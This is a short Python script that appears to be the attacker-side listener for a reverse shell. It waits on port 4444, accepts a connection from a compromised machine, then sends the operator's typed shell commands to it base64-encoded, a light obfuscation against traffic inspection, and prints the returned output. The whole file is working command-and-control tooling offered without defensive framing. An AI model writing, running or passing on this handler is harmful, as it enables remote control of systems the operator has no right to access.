#!/usr/bin/python3
import socket
import base64
HOST = '' # '' means bind to all interfaces.
PORT = 4444 #  Port.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
try:
    s.bind((HOST, PORT)) # Bind to interface.
    print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections.
    s.listen(10) # Listen for only 10 unaccepted connections.
    conn, addr = s.accept() # Accept connections.
    print("[+] Connected by", addr) # Print connected by ipaddress.
    data = (base64.b64decode(conn.recv(4096))).decode("UTF-8") # Receive initial connection.
    print(data)
    while True: # Start loop.
        command = input("") # Enter shell command.
        conn.send(base64.b64encode(bytes(command, "UTF-8"))) # Send shell command.
        if command == "quit" or command == "exit":
            break # If we specify quit then break out of loop and close socket.
        data = (base64.b64decode(conn.recv(4096))).decode("UTF-8") # Receive output from command.
        print(data) # Print the output of the command.
except KeyboardInterrupt: 
    print("...listener terminated using [ctrl+c], Shutting down!")
    conn.send(bytes('exit', "UTF-8"))
    exit() # Using [ctrl+c] will terminate the listener.
    
conn.close() # Close socket.
